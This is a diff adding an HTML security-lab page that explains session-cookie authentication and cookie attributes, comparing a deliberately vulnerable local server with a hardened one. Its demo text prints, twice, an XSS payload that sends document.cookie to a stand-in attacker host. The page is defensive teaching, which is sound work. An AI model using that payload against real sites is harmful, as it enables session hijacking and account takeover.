@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Session Auth Lab</title>
+  <link rel="stylesheet" href="/guide.css">
+</head>
+<body>
+  <h1>🍪 Session Authentication — How It Works</h1>
+  <p class="subtitle">Login creates a server-side session. The browser stores a cookie and sends it on every request.</p>
+
+  <div class="flow-box">
+    <div class="section-title">Session Auth Flow</div>
+    <pre style="color:#00ff41;font-size:0.78rem;line-height:1.6;margin-top:0.5rem">1. LOGIN
+   Client                           Server
+      │                                │
+      ├── POST /api/login ────────────→│
+      │   { username, password }       │
+      │                                │ sessions.set("a3f9...", { username })
+      │←── 200 + Set-Cookie: ─────────┤
+      │    nk_session=a3f9b2c1...      │ ← random token, stored server-side
+      │    HttpOnly; Secure; SameSite  │
+
+2. AUTHENTICATED REQUEST
+      ├── GET /api/notes ────────────→ │
+      │   Cookie: nk_session=a3f9b2c1  │ ← browser sends automatically
+      │                                │ sessions.get("a3f9b2c1") → { username }
+      │←── 200 + notes ───────────────┤
+
+3. LOGOUT
+      ├── POST /api/logout ──────────→ │
+      │                                │ sessions.delete("a3f9b2c1")
+      │←── 200 + Set-Cookie: Max-Age=0 │ ← cookie deleted</pre>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">🔒 Cookie Security Attributes</div>
+    <table style="width:100%;border-collapse:collapse;font-size:0.82rem">
+      <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
+        <th style="text-align:left;padding:0.5rem">Attribute</th>
+        <th>What it does</th>
+        <th>Without it</th>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#4ade80">HttpOnly</td>
+        <td style="padding:0.5rem;color:#94a3b8">JS cannot read the cookie (document.cookie is empty)</td>
+        <td style="padding:0.5rem;color:#fca5a5">XSS can steal the session: document.cookie → send to attacker</td>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#4ade80">Secure</td>
+        <td style="padding:0.5rem;color:#94a3b8">Only sent over HTTPS</td>
+        <td style="padding:0.5rem;color:#fca5a5">Cookie sent over plain HTTP — visible to network eavesdroppers</td>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#4ade80">SameSite=Strict</td>
+        <td style="padding:0.5rem;color:#94a3b8">Cookie not sent on cross-site requests</td>
+        <td style="padding:0.5rem;color:#fca5a5">CSRF possible: attacker's page triggers requests to your app with your cookie</td>
+      </tr>
+      <tr>
+        <td style="padding:0.5rem;color:#fbbf24">SameSite=Lax</td>
+        <td style="padding:0.5rem;color:#94a3b8">Cookie sent on top-level navigation but not sub-resource</td>
+        <td style="padding:0.5rem;color:#94a3b8">Good default if Strict breaks OAuth redirect flows</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">🔍 Cookie Visibility Demo</div>
+    <div style="display:flex;gap:0.75rem;flex-wrap:wrap;margin-bottom:0.75rem">
+      <button class="demo-btn" id="btn-read-3052">Read document.cookie on :3052 (no HttpOnly)</button>
+      <button class="demo-btn" id="btn-read-3054">Read document.cookie on :3054 (HttpOnly)</button>
+    </div>
+    <div class="result-banner" id="cookie-result"></div>
+    <pre class="decoded-box" id="cookie-output" style="min-height:60px">–</pre>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">Session Fixation</div>
+    <p style="color:#94a3b8;font-size:0.85rem;line-height:1.7;max-width:640px">
+      ℹ Sessions can also be vulnerable to session fixation — where the attacker
+      supplies a known session ID before the victim logs in. The fix: always
+      generate a NEW session ID on login (server-side). This demo always does this correctly.
+    </p>
+  </div>
+
+  <div class="target-switcher">
+    <button type="button" class="btn-vulnerable" id="btn-vuln">Vulnerable Cookie (3052)</button>
+    <button type="button" class="btn-protected" id="btn-hard">Hardened Cookie (3054)</button>
+  </div>
+
+  <script>
+    function showResult(id, type, msg) {
+      var el = document.getElementById(id);
+      el.className = 'result-banner ' + type;
+      el.textContent = msg;
+      el.style.display = 'block';
+    }
+
+    document.getElementById('btn-read-3052').addEventListener('click', async function () {
+      try {
+        var res = await fetch('/api/demo-cookie');
+        var data = await res.json();
+        document.getElementById('cookie-output').textContent =
+          'Port 3052 Set-Cookie header:\\n  ' + data.port3052 +
+          '\\n\\nBecause HttpOnly is MISSING:\\n' +
+          '  document.cookie → "nk_session=a3f9b2c1d4e5f6..."  ← readable by JS\\n\\n' +
+          'XSS payload that steals it:\\n' +
+          '  document.location = "http://attacker.com/steal?c=" + document.cookie\\n\\n' +
+          'Attacker receives:\\n' +
+          '  GET /steal?c=nk_session%3Da3f9b2c1d4e5f6... HTTP/1.1\\n' +
+          '  → Now has a valid session token for the victim\\'s account';
+        showResult('cookie-result', 'failure', '⚠ Cookie readable by JavaScript — XSS can steal this session');
+      } catch (e) {
+        document.getElementById('cookie-output').textContent = e.message;
+        showResult('cookie-result', 'failure', '✗ Could not reach guide server: ' + e.message);
+      }
+    });
+
+    document.getElementById('btn-read-3054').addEventListener('click', function () {
+      document.getElementById('cookie-output').textContent =
+        'Port 3054 Set-Cookie header:\\n  Set-Cookie: nk_session=&lt;token&gt;; Path=/; HttpOnly; SameSite=Strict' +
+        '\\n\\nBecause HttpOnly IS set:\\n' +
+        '  document.cookie → ""  (empty string)\\n\\n' +
+        'The browser still sends the cookie automatically on every HTTP request to the same origin,\\n' +
+        'but JavaScript — including any injected XSS payload — cannot read it.\\n\\n' +
+        'Even this XSS payload fails:\\n' +
+        '  document.location = "http://attacker.com/steal?c=" + document.cookie\\n' +
+        '  → attacker receives: GET /steal?c=  (empty — no token)';
+      showResult('cookie-result', 'success', '✅ HttpOnly: document.cookie returns "" — XSS cannot steal this token');
+    });
+
+    document.getElementById('btn-vuln').addEventListener('click', function () {
+      window.open('http://localhost:3052');
+    });
+    document.getElementById('btn-hard').addEventListener('click', function () {
+      window.open('http://localhost:3054');
+    });
+  </script>
+</body>
+</html>
